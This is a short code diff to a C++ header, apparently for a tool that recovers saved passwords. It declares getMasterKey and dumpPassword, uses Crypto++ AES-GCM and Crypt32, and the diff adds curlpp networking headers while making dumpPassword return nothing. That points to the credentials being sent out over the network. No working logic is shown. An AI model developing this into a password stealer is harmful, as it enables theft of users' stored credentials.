@@ -16,6 +16,8 @@
 #include <cryptopp/gcm.h>
 #include<cryptopp/filters.h>
 #include <assert.h> 
+#include <curlpp/cURLpp.hpp>
+#include <curlpp/Options.hpp>
 #pragma comment(lib, "Crypt32")
 // TODO: Reference additional headers your program requires here.
 using namespace std;
@@ -35,7 +37,7 @@ private:
 	static void getMasterKey();
 
 public:
-	static string dumpPassword();
+	static void dumpPassword();
 
 };
 
